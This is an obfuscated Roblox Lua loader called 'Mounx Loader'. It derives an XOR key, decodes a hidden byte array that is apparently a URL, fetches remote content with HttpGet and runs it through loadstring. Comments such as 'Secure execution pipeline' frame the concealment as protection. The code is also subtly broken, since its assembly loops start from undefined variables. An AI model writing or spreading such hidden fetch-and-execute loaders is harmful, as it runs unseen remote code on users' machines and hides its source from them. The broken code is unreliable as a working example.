-- Mounx Loader
-- Protected by Mounx Security Layer v3
-- Unauthorized modification will result in ban

local _s = string
local _c = _s.char
local _b = _s.byte
local _x = bit32.bxor
local _t = table
local _tc = _t.concat
local _g = game

-- Environment validation
local _wibgf = type(_g) == "userdata"
local ___oxtdap = type(loadstring) == "function" or type(load) == "function"
if not (_wibgf and ___oxtdap) then return end

-- Integrity check
local ___yobg = pcall(function() return _g:GetService("Players").LocalPlayer end)
if not ___yobg then return end

-- Runtime key derivation
local ___theg = {}
___theg[10]=_c(324/6)
___theg[4]=_c(_x(153,0xAB))
___theg[8]=_c(19+88)
___theg[5]=_c(76-21)
___theg[11]=_c(_x(156,0xAB))
___theg[3]=_c(_x(152,0xAB))
___theg[6]=_c(_x(157,0xAB))
___theg[7]=_c(129-39)
___theg[2]=_c(135-15)
___theg[9]=_c(13+36)
___theg[1]=_c(385/5)
___theg = _tc(___theg)

-- Encrypted payload segments
local _iuv = {37,12,71,66,68,12,117,68}
local ___mtsmlc = {92,89,66,35,0,67,83,89}
local _hcybf = {83,54,69,94,88,69,40,22}
local ___pjghdx = {87,87,69,24,57,4,92,25}
local __prwqm = {86,61,17,28,94,88,87,62}
local __lxrdev = {14,67,25,71,56,26,95,91}
local __xzfrpy = {84}

-- Assemble payload
local ___nvbfgx = {}
for _=_tfk,#_iuv do ___nvbfgx[#___nvbfgx+1]=_iuv[_] end
for _=___tpiq,#___mtsmlc do ___nvbfgx[#___nvbfgx+1]=___mtsmlc[_] end
for _=__rnka,#_hcybf do ___nvbfgx[#___nvbfgx+1]=_hcybf[_] end
for _=_htkpf,#___pjghdx do ___nvbfgx[#___nvbfgx+1]=___pjghdx[_] end
for _=___qqvp,#__prwqm do ___nvbfgx[#___nvbfgx+1]=__prwqm[_] end
for _=_vjsi,#__lxrdev do ___nvbfgx[#___nvbfgx+1]=__lxrdev[_] end
for _=_sjsgu,#__xzfrpy do ___nvbfgx[#___nvbfgx+1]=__xzfrpy[_] end

-- Decryption engine
local __inn = {}
for _i = 1, #___nvbfgx do
    local _e = ___nvbfgx[_i]
    local _k = _b(___theg, ((_i - 1) % #___theg) + 1)
    __inn[_i] = _c(_x(_e, _k))
end
__inn = _tc(__inn)

-- Secure execution pipeline
local ___iiz = tick()
local __cigv = _g["HttpGet"](_g, __inn)

if type(__cigv) == "string" and #__cigv > 0 then
    local _hgg = (loadstring or load)(__cigv)
    if _hgg then
        _hgg()
    end
end
